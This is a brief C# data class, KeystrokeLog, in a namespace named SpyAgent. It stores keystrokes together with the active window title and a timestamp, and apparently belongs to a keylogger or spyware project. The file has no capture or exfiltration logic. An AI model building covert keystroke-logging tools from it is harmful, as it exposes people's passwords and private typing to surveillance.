namespace SpyAgent.Models;

internal sealed class KeystrokeLog
{
    public required int VirtualKeyCode { get; init; }
    public required string Character { get; init; }
    public required string WindowTitle { get; init; }
    public required DateTime Timestamp { get; init; }

    public override string ToString() =>
        $"[{Timestamp:HH:mm:ss.fff}] ({WindowTitle}) {Character}";
}
